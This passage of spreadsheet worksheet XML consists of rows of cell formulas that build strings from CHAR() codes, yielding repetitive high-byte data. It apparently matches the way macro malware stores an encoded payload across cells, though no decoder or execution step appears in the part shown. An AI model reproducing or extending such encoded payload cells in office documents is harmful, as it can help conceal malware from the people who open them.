        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(109)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6më</v>
      </c>
    </row>
    <row r="225" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C225" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(232)</f>
        <v>»ëóýô6Íë»è</v>
      </c>
    </row>
    <row r="226" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C226" t="str">
        <f>CHAR(247)&amp;CHAR(189)&amp;CHAR(113)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(171)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷½q6Í«»ë÷ý</v>
      </c>
    </row>
    <row r="227" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C227" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(141)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6ë»ë÷ýô6</v>
      </c>
    </row>
    <row r="228" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C228" t="str">
        <f>CHAR(205)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(237)&amp;CHAR(235)</f>
        <v>Íû»ë÷ýô6íë</v>
      </c>
    </row>
    <row r="229" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C229" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(251)</f>
        <v>»ë÷ýô6Íë»û</v>
      </c>
    </row>
    <row r="230" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C230" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="231" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C231" t="str">
        <f>CHAR(244)&amp;CHAR(70)&amp;CHAR(255)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(176)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ôFÿë»°÷ýô6</v>
      </c>
    </row>
    <row r="232" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C232" t="str">
        <f>CHAR(173)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(243)&amp;CHAR(244)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>­ë»óôýô6Íë</v>
      </c>
    </row>
    <row r="233" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C233" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="234" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C234" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(77)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(231)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Më»ç÷ý</v>
      </c>
    </row>
    <row r="235" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C235" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="236" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C236" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="237" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C237" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="238" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C238" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="239" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C239" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="240" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C240" t="str">
        <f>CHAR(237)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(251)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>íë»û÷ýô6Íë</v>
      </c>
    </row>
    <row r="241" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C241" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(38)&amp;CHAR(237)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(163)</f>
        <v>»ë÷ýô&amp;íë»£</v>
      </c>
    </row>
    <row r="242" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C242" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="243" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C243" t="str">
        <f>CHAR(244)&amp;CHAR(24)&amp;CHAR(185)&amp;CHAR(142)&amp;CHAR(195)&amp;CHAR(159)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(236)</f>
        <v>ô_x0018_¹ŽÃŸ÷ýôì</v>
      </c>
    </row>
    <row r="244" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C244" t="str">
        <f>CHAR(223)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(215)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(217)&amp;CHAR(235)</f>
        <v>ßë»ë×ýô6Ùë</v>
      </c>
    </row>
    <row r="245" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C245" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ëóýô6Íë»ë</v>
      </c>
    </row>
    <row r="246" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C246" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(203)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»Ë÷ý</v>
      </c>
    </row>
    <row r="247" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C247" t="str">
        <f>CHAR(148)&amp;CHAR(24)&amp;CHAR(190)&amp;CHAR(143)&amp;CHAR(218)&amp;CHAR(159)&amp;CHAR(150)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(82)</f>
        <v>”_x0018_¾ÚŸ–ýôR</v>
      </c>
    </row>
    <row r="248" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C248" t="str">
        <f>CHAR(204)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(183)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(207)&amp;CHAR(235)</f>
        <v>Ìë»ë·ýô6Ïë</v>
      </c>
    </row>
    <row r="249" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C249" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(239)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ëïýô6Íë»ë</v>
      </c>
    </row>
    <row r="250" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C250" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(171)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»«÷ý</v>
      </c>
    </row>
    <row r="251" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C251" t="str">
        <f>CHAR(52)&amp;CHAR(24)&amp;CHAR(191)&amp;CHAR(152)&amp;CHAR(201)&amp;CHAR(136)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(46)</f>
        <v>4_x0018_¿˜Éˆ÷ýô.</v>
      </c>
    </row>
    <row r="252" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C252" t="str">
        <f>CHAR(206)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(151)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(201)&amp;CHAR(235)</f>
        <v>Îë»ë—ýô6Éë</v>
      </c>
    </row>
    <row r="253" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C253" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(237)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ëíýô6Íë»ë</v>
      </c>
    </row>
    <row r="254" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C254" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(171)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»«÷ý</v>
      </c>
    </row>
    <row r="255" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C255" t="str">
        <f>CHAR(180)&amp;CHAR(24)&amp;CHAR(191)&amp;CHAR(142)&amp;CHAR(215)&amp;CHAR(132)&amp;CHAR(148)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(58)</f>
        <v>´_x0018_¿Ž×„”ýô:</v>
      </c>
    </row>
    <row r="256" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C256" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(119)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(207)&amp;CHAR(235)</f>
        <v>Íë»ëwýô6Ïë</v>
      </c>
    </row>
    <row r="257" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C257" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(233)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ëéýô6Íë»ë</v>
      </c>
    </row>
    <row r="258" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C258" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(171)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»«÷ý</v>
      </c>
    </row>
    <row r="259" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C259" t="str">
        <f>CHAR(182)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>¶6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="260" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C260" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="261" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C261" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="262" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C262" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="263" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C263" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="264" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C264" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="265" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C265" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="266" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C266" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="267" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C267" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="268" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C268" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="269" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C269" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="270" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C270" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="271" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C271" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="272" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C272" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="273" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C273" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="274" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C274" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="275" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C275" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="276" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C276" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="277" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C277" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="278" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C278" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="279" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C279" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="280" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C280" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="281" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C281" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="282" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C282" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="283" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C283" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="284" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C284" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="285" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C285" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="286" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C286" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="287" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C287" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="288" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C288" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="289" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C289" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="290" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C290" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="291" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C291" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="292" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C292" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="293" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C293" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="294" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C294" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="295" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C295" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="296" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C296" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="297" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C297" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="298" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C298" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="299" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C299" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="300" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C300" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="301" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C301" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="302" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C302" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
